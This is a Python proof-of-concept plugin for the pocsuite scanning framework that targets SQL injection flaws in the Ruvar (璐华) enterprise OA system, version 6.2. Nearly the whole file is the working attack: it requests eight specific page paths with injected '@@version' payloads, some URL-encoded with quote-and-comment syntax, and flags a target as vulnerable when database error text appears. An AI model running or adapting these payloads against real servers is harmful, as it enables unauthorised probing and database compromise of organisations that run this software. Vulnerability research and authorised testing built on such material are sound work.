#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import time
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register



class TestPOC(POCBase):
    name = u'璐华企业版OA系统 - sql injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=65421']
    desc = u'''璐华企业版OA系统多处SQL注入'''

    vulDate = '2014-09-17'
    createDate = '2019-03-21'
    updateDate = '2019-03-21'

    appName = '璐华企业版OA系统'
    appVersion = '6.2'
    appPowerLink = 'http://www.ruvar.com/'
    samples = ['re']

    def _attack(self):
        "attack mode"
        return self._verify()
        pass

    def _verify(self):
        "verify  mode"
        result = {}
        payload = {
            "/PersonalAffair/worklog_template_show.aspx?id=@@version",
            "/ProjectManage/pm_gatt_inc.aspx?project_id=@@version",
            "/WorkPlan/plan_template_preview.aspx?template_id=@@version",
            "/WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27%20and%20%28@@version%29>0%29--",
            "/WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28@@version%29>0--",
            "/WorkFlow/wf_work_print.aspx?idlist=@@version",
            "/WorkFlow/wf_work_stat_setting.aspx?template_id=@@version",
            "/WorkFlow/wf_get_fields_approve.aspx?template_id=@@version"
        }
        for pay in payload:
            url = self.url + pay
            resp = req.get(url)
            # con = re.search('nvarchar', resp.text)
            time.sleep(2)
            if 'nvarchar' in resp.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)

